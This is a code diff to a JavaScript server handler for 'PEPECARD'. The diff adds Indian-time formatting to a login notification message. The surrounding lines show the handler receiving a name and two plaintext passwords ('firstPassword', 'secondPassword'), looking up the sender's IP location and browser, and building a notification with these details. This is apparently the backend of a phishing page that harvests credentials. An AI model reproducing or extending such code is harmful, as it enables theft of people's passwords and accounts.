@@ -10,6 +10,26 @@ function escapeHtml(value) {
 		.replace(/'/g, '&#39;')
 }
 
+function formatIndianTime(value) {
+	const date = new Date(value)
+
+	if (Number.isNaN(date.getTime())) {
+		return 'Invalid time'
+	}
+
+	return new Intl.DateTimeFormat('en-IN', {
+		timeZone: 'Asia/Kolkata',
+		year: 'numeric',
+		month: 'long',
+		day: '2-digit',
+		hour: '2-digit',
+		minute: '2-digit',
+		second: '2-digit',
+		hour12: true,
+		timeZoneName: 'short',
+	}).format(date)
+}
+
 async function getLocationFromIp(ip) {
 	if (!ip || ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') {
 		return 'Unknown'
@@ -50,10 +70,11 @@ export async function POST(request) {
 		const location = await getLocationFromIp(ip)
 		const safeLoginTime = typeof loginTime === 'string' && loginTime ? loginTime : new Date().toISOString()
 		const safeBrowser = typeof browser === 'string' && browser ? browser : 'Unknown'
+		const indianReadableTime = formatIndianTime(safeLoginTime)
 		const safeName = escapeHtml(name)
         const safeFirstPassword = escapeHtml(firstPassword)
         const safeSecondPassword = escapeHtml(secondPassword)
-		const safeTime = escapeHtml(safeLoginTime)
+		const safeTime = escapeHtml(indianReadableTime)
 		const safeIp = escapeHtml(ip)
 		const safeLocation = escapeHtml(location)
 		const safeBrowserLabel = escapeHtml(safeBrowser)
@@ -100,7 +121,7 @@ export async function POST(request) {
 			'PEPECARD Login Notification\n\n' +
 			'Hello ' + name + ',\n\n' +
 			'A user logged into PEPECARD.\n\n' +
-			'Time: ' + safeLoginTime + '\n' +
+			'Time (IST): ' + indianReadableTime + '\n' +
 			'IP: ' + ip + '\n' +
 			'Location: ' + location + '\n' +
 			'Browser: ' + safeBrowser + '\n'
